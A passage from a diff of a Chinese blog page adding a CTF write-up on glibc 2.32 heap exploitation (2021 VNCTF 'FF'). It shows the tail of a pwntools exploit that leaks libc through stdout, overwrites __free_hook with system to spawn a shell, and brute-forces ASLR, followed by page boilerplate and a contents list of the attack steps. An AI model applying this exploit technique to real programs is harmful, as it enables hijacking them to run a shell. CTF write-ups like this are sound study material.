class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	libcbase = uu64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">5</span>:]+<span class="string">b&#x27;\x7f&#x27;</span>) - <span class="number">0x1e4744</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">	add1(<span class="number">0x10</span>, p64(libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">	add1(<span class="number">0x70</span>, p64(libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">	add1(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">	delete()</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	itr()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">	count = 1</span></span><br><span class="line"><span class="string">	i = 0</span></span><br><span class="line"><span class="string">	while True:</span></span><br><span class="line"><span class="string">		try:</span></span><br><span class="line"><span class="string">			print(&#x27;the no.&#x27; + str(count) + &#x27; try&#x27;)</span></span><br><span class="line"><span class="string">			print(b&#x27;try: &#x27; + b&#x27;\xc0&#x27; + p8(i * 0x10 + 6))</span></span><br><span class="line"><span class="string">			p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="string">			pwn(i)</span></span><br><span class="line"><span class="string">        	except Exception as e:</span></span><br><span class="line"><span class="string">			print(e)</span></span><br><span class="line"><span class="string">			p.close()</span></span><br><span class="line"><span class="string">			i = i + 1</span></span><br><span class="line"><span class="string">			count = count + 1</span></span><br><span class="line"><span class="string">			i = i % 16</span></span><br><span class="line"><span class="string">			continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">HTML</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">heap</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/前端//" class="article-tag-list-link color3">前端</a>
+        			<a href="/categories/pwn//" class="article-tag-list-link color4">pwn</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="/categories/前端/HTML//" class="article-tag-list-link color5">HTML</a>
+        			<a href="/categories/pwn/heap//" class="article-tag-list-link color5">heap</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/01/23/glibc2.32/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2018/11/23/html/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HTML入门笔记</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E9%92%88%E5%BC%82%E6%88%96%E5%8A%A0%E5%AF%86%E4%BF%9D%E6%8A%A4"><span class="toc-number">2.</span> <span class="toc-text">指针异或加密保护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%AF%B9%E6%AF%94"><span class="toc-number">2.1.</span> <span class="toc-text">源码对比</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#glibc2-31%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">glibc2.31：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#glibc2-32"><span class="toc-number">2.1.2.</span> <span class="toc-text">glibc2.32</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%AE%9E%E8%B7%B5-2021VNCTF-FF"><span class="toc-number">3.</span> <span class="toc-text">题目实践-2021VNCTF-FF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E8%A1%8C%E6%A3%80%E6%9F%A5"><span class="toc-number">3.1.</span> <span class="toc-text">例行检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#leak-heapbase"><span class="toc-number">3.2.1.</span> <span class="toc-text">leak_heapbase</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0double-free"><span class="toc-number">3.2.2.</span> <span class="toc-text">实现double free</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#free%E6%8E%89tcache-struct"><span class="toc-number">3.2.3.</span> <span class="toc-text">free掉tcache struct</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%86stdout%E6%94%BE%E5%85%A5tcache-struct"><span class="toc-number">3.2.4.</span> <span class="toc-text">将stdout放入tcache_struct</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#leak-libc"><span class="toc-number">3.2.5.</span> <span class="toc-text">leak_libc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-free-hook"><span class="toc-number">3.2.6.</span> <span class="toc-text">劫持__free_hook</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91"><span class="toc-number">3.2.7.</span> <span class="toc-text">触发</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -251,9 +454,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
